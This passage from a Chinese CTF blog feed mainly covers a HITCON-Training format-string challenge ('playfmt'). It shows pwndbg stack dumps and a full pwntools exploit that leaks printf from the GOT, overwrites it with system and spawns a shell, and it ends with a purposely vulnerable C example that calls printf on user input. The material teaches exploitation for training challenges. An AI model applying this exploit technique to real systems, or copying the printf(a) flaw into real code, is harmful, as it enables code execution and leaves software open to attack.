0xffffd3ec —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd3f0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d</span><br><span class="line">05:0014│      0xffffd3f4 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"></span><br><span class="line">06:0018│ ebp  0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd418 ◂— 0x0 ****ebp*****</span><br><span class="line">07:001c│      0xffffd3fc —▸ 0x8048584 (play+59) ◂— nop      ****ebp+0x4***</span><br><span class="line">08:0020│      0xffffd400 —▸ 0xf7fadd60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffffd404 ◂— 0x0</span><br><span class="line">0a:0028│      0xffffd408 —▸ 0xffffd418 ◂— 0x0**ebp+0x10**</span><br><span class="line">0b:002c│      0xffffd40c —▸ 0x80485b1 (main+42) ◂— nop    **ebp+0x14**</span><br><span class="line">0c:0030│      0xffffd410 —▸ 0xf7fad3dc (__exit_funcs) —▸ 0xf7fae1e0 (initial) ◂— 0x0</span><br><span class="line">0d:0034│      0xffffd414 —▸ 0xffffd430 ◂— 0x1</span><br><span class="line">0e:0038│      0xffffd418 ◂— 0x0</span><br><span class="line">0f:003c│      0xffffd41c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br><span class="line">10:0040│      0xffffd420 ◂— 0x1</span><br><span class="line">11:0044│      0xffffd424 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">12:0048│      0xffffd428 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd42c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br></pre></td></tr></table></figure><p>首先我们知道<code>ebp -&gt; ebp+0x10</code>，如果我们能使<code>ebp+0x10 -&gt; ebp+0x4</code>，那么就能通过修改<code>ebp+0x10</code>的内容的值为<code>printf_got</code>，从而泄露<code>printf</code>的真实地址，得到<code>system</code>的真实地址。</p><p><strong>注意</strong>：当我们通过<code>%123c%10$hn</code>修改值的时候，实际上是修改<code>0xffffd408</code>的内容的值的低两个字节为<code>123</code>，这里有两层的递进，每次做pwn都要在我到底改的是哪层纠结好久:-(</p><p>第一次利用<code>ebp+0x4</code>存<code>printf_got</code>，并通过<code>%$hn</code>将<code>printf_got</code>原本存的<code>printf</code>的真实地址的低两个字节修改为<code>system</code>的真实地址的低两个字节，第二次利用<code>ebp+0x14</code>存<code>printf_got+2</code>，将<code>printf</code>的真实地址的高两个字节修改为<code>system</code>的真实地址的高两个字节。达到将<code>printf</code>函数覆盖为<code>system</code>函数的目的。</p><blockquote><p>在写脚本的时候遇到了一个问题，io.recv()每次接受0x1000个字节，但是我每次都发了超过0x1000个字节，这会导致后面在通过一些标志字符io.recvuntil的时候报EOF错误，后来我每次发完之后通过my_recv函数把字符接收完成再进行下一次操作:-)</p><p>我看m4x学长的<a href="http://m4x.fun/post/hitcon-training-writeup/" target="_blank" rel="noopener">题解</a>发现他那没有这个问题，好像是因为他用的是io.sendafter，就没有recv</p></blockquote><p>exp如下，过程中栈的“理想”内容放里面了，应该挺好理解的:-)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]</span><br><span class="line"></span><br><span class="line">io = process(&apos;./playfmt&apos;)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def my_recv():</span><br><span class="line"></span><br><span class="line">    while 1:</span><br><span class="line">        io.sendline(&apos;233\0&apos;)</span><br><span class="line">        sleep(0.2)</span><br><span class="line">        aa = io.recv()</span><br><span class="line">        if aa.find(&apos;233&apos;) != -1:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(io,&quot;b *do_fmt&quot;)</span><br><span class="line">    printf_got = 0x0804A010 </span><br><span class="line">    </span><br><span class="line">    io.sendline(&apos;-%6$x-&apos;)</span><br><span class="line">    io.recvuntil(&apos;-&apos;)</span><br><span class="line">    ebp = int(io.recvuntil(&apos;-&apos;)[:-1],16)-0x10 </span><br><span class="line">    </span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp  0xffffd3e0 —▸ 0x804a060 (buf) ◂— &apos;aaaa\n&apos;</span><br><span class="line">01:0004│      0xffffd3e4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &apos;quit&apos; */</span><br><span class="line">02:0008│      0xffffd3e8 ◂— 0x4</span><br><span class="line">03:000c│      0xffffd3ec —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd3f0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d</span><br><span class="line">05:0014│      0xffffd3f4 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">06:0018│ ebp  0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd418 ◂— 0x0//ebp// </span><br><span class="line">07:001c│      0xffffd3fc —▸ 0x8048584 (play+59) ◂— nop//ebp+1//</span><br><span class="line">08:0020│      0xffffd400 —▸ 0xf7fadd60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffffd404 ◂— 0x0</span><br><span class="line">0a:0028│      0xffffd408 —▸ 0xffffd418 ◂— 0x0//ebp+4//</span><br><span class="line">0b:002c│      0xffffd40c —▸ 0x80485b1 (main+42) ◂— nop//ebp+5//</span><br><span class="line">0c:0030│      0xffffd410 —▸ 0xf7fad3dc (__exit_funcs) —▸ 0xf7fae1e0 (initial) ◂— 0x0</span><br><span class="line">0d:0034│      0xffffd414 —▸ 0xffffd430 ◂— 0x1</span><br><span class="line">0e:0038│      0xffffd418 ◂— 0x0</span><br><span class="line">0f:003c│      0xffffd41c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br><span class="line">10:0040│      0xffffd420 ◂— 0x1</span><br><span class="line">11:0044│      0xffffd424 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">12:0048│      0xffffd428 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd42c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">    #ebp_4 -&gt; ebp_1 </span><br><span class="line">    print &quot;ebp+4 = &#123;&#125;&quot;.format(hex(ebp+4))</span><br><span class="line">    payload = &quot;%&quot; + str((ebp+4)&amp;0xffff) + &quot;c%6$hn&quot;</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info(payload)</span><br><span class="line">    my_recv()</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    io.sendline(&apos;+%10$p+&apos;)</span><br><span class="line">    io.recvuntil(&apos;+&apos;)</span><br><span class="line">    io.recvuntil(&apos;+&apos;)</span><br><span class="line">    pause()</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp  0xffffd3e0 —▸ 0x804a060 (buf) ◂— &apos;%54268c%6$hn\n&apos;</span><br><span class="line">01:0004│      0xffffd3e4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &apos;quit&apos; */</span><br><span class="line">02:0008│      0xffffd3e8 ◂— 0x4</span><br><span class="line">03:000c│      0xffffd3ec —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd3f0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d</span><br><span class="line">05:0014│      0xffffd3f4 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">06:0018│ ebp  0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd3fc —▸ 0x8048584 (play+59) ◂— nop</span><br><span class="line">07:001c│      0xffffd3fc —▸ 0x8048584 (play+59) ◂— nop</span><br><span class="line">08:0020│      0xffffd400 —▸ 0xf7fadd60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffffd404 ◂— 0x0</span><br><span class="line">0a:0028│      0xffffd408 —▸ 0xffffd3fc —▸ 0x8048584 (play+59) ◂— nop</span><br><span class="line">0b:002c│      0xffffd40c —▸ 0x80485b1 (main+42) ◂— nop</span><br><span class="line">0c:0030│      0xffffd410 —▸ 0xf7fad3dc (__exit_funcs) —▸ 0xf7fae1e0 (initial) ◂— 0x0</span><br><span class="line">0d:0034│      0xffffd414 —▸ 0xffffd430 ◂— 0x1</span><br><span class="line">0e:0038│      0xffffd418 ◂— 0x0</span><br><span class="line">0f:003c│      0xffffd41c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br><span class="line">10:0040│      0xffffd420 ◂— 0x1</span><br><span class="line">11:0044│      0xffffd424 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">12:0048│      0xffffd428 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd42c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    #ebp_1 -&gt; printf_got</span><br><span class="line">    payload = &quot;%&quot; + str(printf_got&amp;0xffff) + &quot;c%10$hn&quot;</span><br><span class="line">#gdb.attach(io,&apos;b *0x80484fb\nc&apos;)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info(payload)</span><br><span class="line">    my_recv()</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line">    io.sendline(&apos;-%7$p-&apos;)</span><br><span class="line">    io.recvuntil(&apos;-&apos;)</span><br><span class="line">    io.recvuntil(&apos;-&apos;)</span><br><span class="line">    pause()</span><br><span class="line">    #print hex(leak_printf())</span><br><span class="line"></span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp  0xffffd3e0 —▸ 0x804a060 (buf) ◂— &apos;%40976c%10$hn\n&apos;</span><br><span class="line">01:0004│      0xffffd3e4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &apos;quit&apos; */</span><br><span class="line">02:0008│      0xffffd3e8 ◂— 0x4</span><br><span class="line">03:000c│      0xffffd3ec —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd3f0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d</span><br><span class="line">05:0014│      0xffffd3f4 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">06:0018│ ebp  0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd3fc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7e43930 (printf) ◂— ...</span><br><span class="line">07:001c│      0xffffd3fc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7e43930 (printf) ◂— call   0xf7f1aae9</span><br><span class="line">08:0020│      0xffffd400 —▸ 0xf7fadd60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffffd404 ◂— 0x0</span><br><span class="line">0a:0028│      0xffffd408 —▸ 0xffffd3fc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7e43930 (printf) ◂— call   0xf7f1aae9</span><br><span class="line">0b:002c│      0xffffd40c —▸ 0x80485b1 (main+42) ◂— nop</span><br><span class="line">0c:0030│      0xffffd410 —▸ 0xf7fad3dc (__exit_funcs) —▸ 0xf7fae1e0 (initial) ◂— 0x0</span><br><span class="line">0d:0034│      0xffffd414 —▸ 0xffffd430 ◂— 0x1</span><br><span class="line">0e:0038│      0xffffd418 ◂— 0x0</span><br><span class="line">0f:003c│      0xffffd41c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br><span class="line">10:0040│      0xffffd420 ◂— 0x1</span><br><span class="line">11:0044│      0xffffd424 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">12:0048│      0xffffd428 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd42c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">    </span><br><span class="line">#print hex(leak_printf())</span><br><span class="line">    </span><br><span class="line">    #ebp_4 -&gt; ebp_5</span><br><span class="line">    payload = &apos;%&apos; + str((ebp+0x14)&amp;0xffff) + &apos;c%6$hn&apos;</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info(payload) </span><br><span class="line">    my_recv()</span><br><span class="line">    pause()</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp  0xffffd3e0 —▸ 0x804a060 (buf) ◂— &apos;%54284c%6$hn\n\n&apos;</span><br><span class="line">01:0004│      0xffffd3e4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &apos;quit&apos; */</span><br><span class="line">02:0008│      0xffffd3e8 ◂— 0x4</span><br><span class="line">03:000c│      0xffffd3ec —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd3f0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d</span><br><span class="line">05:0014│      0xffffd3f4 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">06:0018│ ebp  0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd40c —▸ 0x80485b1 (main+42) ◂— nop</span><br><span class="line">07:001c│      0xffffd3fc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7e43930 (printf) ◂— call   0xf7f1aae9</span><br><span class="line">08:0020│      0xffffd400 —▸ 0xf7fadd60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffffd404 ◂— 0x0</span><br><span class="line">0a:0028│      0xffffd408 —▸ 0xffffd40c —▸ 0x80485b1 (main+42) ◂— nop</span><br><span class="line">0b:002c│      0xffffd40c —▸ 0x80485b1 (main+42) ◂— nop</span><br><span class="line">0c:0030│      0xffffd410 —▸ 0xf7fad3dc (__exit_funcs) —▸ 0xf7fae1e0 (initial) ◂— 0x0</span><br><span class="line">0d:0034│      0xffffd414 —▸ 0xffffd430 ◂— 0x1</span><br><span class="line">0e:0038│      0xffffd418 ◂— 0x0</span><br><span class="line">0f:003c│      0xffffd41c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br><span class="line">10:0040│      0xffffd420 ◂— 0x1</span><br><span class="line">11:0044│      0xffffd424 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">12:0048│      0xffffd428 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd42c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">    #ebp_5 -&gt; printf_got+2</span><br><span class="line">    payload = &apos;%&apos; + str((printf_got+2)&amp;0xffff) + &apos;c%10$hn&apos; </span><br><span class="line">    io.sendline( payload)</span><br><span class="line">    info(payload)</span><br><span class="line">    my_recv()</span><br><span class="line">    pause()</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp  0xffffd3e0 —▸ 0x804a060 (buf) ◂— &apos;%40978c%10$hn\n&apos;</span><br><span class="line">01:0004│      0xffffd3e4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &apos;quit&apos; */</span><br><span class="line">02:0008│      0xffffd3e8 ◂— 0x4</span><br><span class="line">03:000c│      0xffffd3ec —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd3f0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d</span><br><span class="line">05:0014│      0xffffd3f4 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">06:0018│ ebp  0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd40c —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0x9870f7e4</span><br><span class="line">07:001c│      0xffffd3fc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7e43930 (printf) ◂— call   0xf7f1aae9</span><br><span class="line">08:0020│      0xffffd400 —▸ 0xf7fadd60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffffd404 ◂— 0x0</span><br><span class="line">0a:0028│      0xffffd408 —▸ 0xffffd40c —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0x9870f7e4</span><br><span class="line">0b:002c│      0xffffd40c —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0x9870f7e4</span><br><span class="line">0c:0030│      0xffffd410 —▸ 0xf7fad3dc (__exit_funcs) —▸ 0xf7fae1e0 (initial) ◂— 0x0</span><br><span class="line">0d:0034│      0xffffd414 —▸ 0xffffd430 ◂— 0x1</span><br><span class="line">0e:0038│      0xffffd418 ◂— 0x0</span><br><span class="line">0f:003c│      0xffffd41c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br><span class="line">10:0040│      0xffffd420 ◂— 0x1</span><br><span class="line">11:0044│      0xffffd424 —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">12:0048│      0xffffd428 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd42c —▸ 0xf7e12276 (__libc_start_main+246) ◂— add    esp, 0x10</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    #leak_printf</span><br><span class="line">    </span><br><span class="line">    io.sendline(&apos;+%7$s+&apos;)</span><br><span class="line">    io.recvuntil(&apos;+&apos;)</span><br><span class="line">    printf_addr = u32(io.recv()[:4])</span><br><span class="line">    print &quot;[+]printf -&gt; &#123;&#125;&quot;.format(hex(printf_addr))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    system_addr = libc.symbols[&apos;system&apos;] + printf_addr - libc.symbols[&apos;printf&apos;]</span><br><span class="line">    payload = &apos;%&apos; + str(system_addr&amp;0xffff) + &apos;c%7$hn&apos;</span><br><span class="line">    if (system_addr&gt;&gt;16)-(system_addr&amp;0xffff) &lt; 0 :</span><br><span class="line">        payload += &apos;%&apos; + str(0xffff+(system_addr&gt;&gt;16)-(system_addr&amp;0xffff)) + &apos;c%11$hn&apos;</span><br><span class="line">    else:</span><br><span class="line">        payload += &apos;%&apos; + str((system_addr&gt;&gt;16)-(system_addr&amp;0xffff)) + &apos;c%11$hn&apos;</span><br><span class="line"></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">#print hex(system_addr)</span><br><span class="line">    io.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line">    </span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;题目地址：&lt;a href=&quot;https://github.com/scwuaptx/HITCON-Training&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/scwuaptx/HITCON-Training&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;HITCON-Training-lab7&quot;&gt;&lt;a href=&quot;#HITCON-Training-lab7&quot; class=&quot;headerlink&quot; title=&quot;HITCON-Training-lab7&quot;&gt;&lt;/a&gt;HITCON-Training-lab7&lt;/h3&gt;&lt;p&gt;首先&lt;code&gt;checksec&lt;/code&gt;一下&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;▶ checksec crack &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[*] &amp;apos;HITCON-Training-master/LAB/lab7/crack&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Arch:     i386-32-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PIE:      No PIE (0x8048000)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;开了栈保护，NX保护(shellcode不可执行)，但没开PIE(地址不随机化)&lt;/p&gt;
&lt;p&gt;用IDA看下伪代码可以发现&lt;code&gt;printf(&amp;amp;buf)&lt;/code&gt;，典型的&lt;code&gt;Format String Bug&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;分析代码发现只要知道了随机化的password即可得到flag，所以这里只用实现&lt;strong&gt;任意地址的读&lt;/strong&gt;，当然也有其他方法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Format-String-Bug" scheme="https://l1b0.fun/tags/Format-String-Bug/"/>
    
  </entry>
  
  <entry>
    <title>Format-String-Bug-Easy-examples</title>
    <link href="https://l1b0.fun/2018/08/06/Format-String-Bug-Easy-examples/"/>
    <id>https://l1b0.fun/2018/08/06/Format-String-Bug-Easy-examples/</id>
    <published>2018-08-06T12:20:57.000Z</published>
    <updated>2019-09-17T12:22:09.435Z</updated>
    
    <content type="html"><![CDATA[<p>References:</p><ul><li><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748" target="_blank" rel="noopener">关于GOT表和PLT表的作用</a></p></li><li><p><a href="https://www.jianshu.com/p/097e211cd9eb" target="_blank" rel="noopener">自己实现fmtstr_payload</a></p></li></ul><h3 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h3><blockquote><p>自己写了个最简单fsb的example，以此来入个门</p></blockquote><a id="more"></a><h4 id="源码如下"><a href="#源码如下" class="headerlink" title="源码如下"></a>源码如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//gcc -m32 -g test.c -o test -no-pie</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">//__Author__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">int main(int argc, char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">    char a[1024];</span><br><span class="line">    while(1)</span><br><span class="line">    &#123;</span><br><span class="line">        memset(a, &apos;\0&apos;, 1024);</span><br><span class="line">        read(0, a, 1024);</span><br><span class="line">        printf(a);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" 